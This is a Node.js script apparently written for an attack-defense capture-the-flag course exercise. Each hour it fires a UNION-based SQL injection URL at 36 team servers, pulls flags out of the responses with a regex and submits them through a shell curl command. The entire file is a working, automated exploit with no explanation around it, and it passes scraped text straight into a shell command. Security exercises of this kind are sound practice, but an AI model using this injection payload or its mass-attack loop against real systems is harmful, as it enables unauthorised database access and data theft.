var http = require('http');
var colors = require('colors');
var exec = require('child_process').exec;
var schedule = require('node-schedule');

// assembles injection code
var genInjectionCode = function (team) {
    return "http://10.8." + team.toString() + ".100:7788/menu.php/db/name/1'+UNION+SELECT+*+FROM+flag+UNION+SELECT+*+FROM+pm_list+WHERE+id='2";
}

// submit flag
var submit = function (flag) {
    var command = "curl –L http://people.cs.nctu.edu.tw/~hwcheng/NSFinal/flag.php?ID=13&flag=" + flag.toString();
    child = exec(command);
}

// regex for flag scrawling
var regex = /\>(\d) (\w*)\<\/div\>/;

var attack = function (team) {
    // console.log('ATTACKING: '.green + genInjectionCode(team));
    var req = http.request(genInjectionCode(team), function (res) {
        res.setEncoding('utf8');
        res.on('data', function (chunk) {
            match = chunk.toString().match(regex);
            if (match) {
                var flag = match[2];
                console.log('FLAG: '.yellow, team, flag);
                submit(flag);
            }
        });

    });
    req.on('error', function(e) {
      console.log('ERROR: '.red + e.message);
    });
    req.end();
}

var rule = new schedule.RecurrenceRule();
rule.minute = 0;
var j = schedule.scheduleJob(rule, function(){
    console.log('====== START ATTACKING ====='.red);
    for (i = 0; i < 36; i++)
        attack(i);
});
